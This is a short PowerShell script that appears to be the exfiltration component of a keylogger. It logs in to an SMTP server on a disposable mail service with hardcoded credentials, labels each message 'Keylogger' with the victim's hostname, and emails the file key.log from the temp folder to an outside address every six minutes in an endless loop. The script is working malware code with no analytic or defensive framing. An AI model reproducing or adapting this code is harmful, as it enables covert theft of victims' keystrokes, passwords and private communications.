$SMTPServer = 'smtp.yopmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('petitcanard@yopmail.com', 'mypassword')
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'petitcanard@yopmail.com'
$ReportEmail.To.Add('petitcanard@yopmail.com')
$ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
while(1){$ReportEmail.Attachments.Add("$ENV:temp\key.log");$SMTPInfo.Send($ReportEmail);sleep 360}